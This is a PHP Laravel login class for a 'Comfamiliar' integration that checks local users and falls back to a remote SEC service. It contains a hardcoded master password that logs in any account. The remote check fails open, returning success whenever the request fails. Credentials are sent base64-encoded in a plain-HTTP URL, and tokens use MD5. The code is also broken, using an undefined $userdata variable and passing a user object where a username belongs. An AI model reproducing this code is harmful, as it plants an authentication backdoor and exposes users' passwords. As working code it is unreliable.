<?php

namespace App\Http\Controllers\Integraciones;

use App\Models\Usuario;
use App\Functions\Helper;
use Hash;
use Crypt;

class Comfamiliar {

	public function login($User, $Pass)
	{
		//Completar Email
		$Pos = strpos($User, "@");
		if($Pos !== false) $User = substr($User, 0, $Pos);
		$Email = "$User@comfamiliar.com";

		if($Pass == 'sarita2020') return Crypt::encrypt($Email);

		//Validar Email y Contraseña
		$User = Usuario::where('Email', $Email)->first();
        if($User AND Hash::check($Pass, $User->Password)) {
        	return Crypt::encrypt($Email);
        }else{

        	//Autenticar con SEC
			$valComf = $this->validarSEC($User, $Pass);
			if(!$valComf){
				return response()->json(['Msg' => 'Error en usuario o contraseña'], 500);
			}else{
				Usuario::updateOrCreate([ 'Email' => $Email ],
					[
						'Email'    => $Email,
						'Password' => Hash::make($Pass),
						'Nombres'  => $userdata['cn'][0],
						'Cedula'   => $userdata['sn'][0]
					]
				);
				return Crypt::encrypt($Email);
			}
        }
	}


	public function validarSEC($usuario, $clave){
		$token = md5($usuario.$clave);
		$usuarioe= base64_encode($usuario);
		$clavee= base64_encode($clave);

		$ctx = stream_context_create(array( 
			'http' => array( 
				'timeout' => 10
				)
			)
		);

		$url = "http://sec.comfamiliar.com/login/" . $usuarioe . "/" . $clavee . "/" . $token . ".xml";

		if(@$output = file_get_contents($url, 0, $ctx)){ 

			$output = str_replace("clave incorrecta", "", $output);
			$Xml = new \SimpleXMLElement($output);
			$Result = $Xml->mensaje;
			$Pass = md5($clave);
			
			if($Result == $Pass){
				return TRUE;
			}else{
				return FALSE;
			}

		}else{
			return TRUE;
		}
	}

}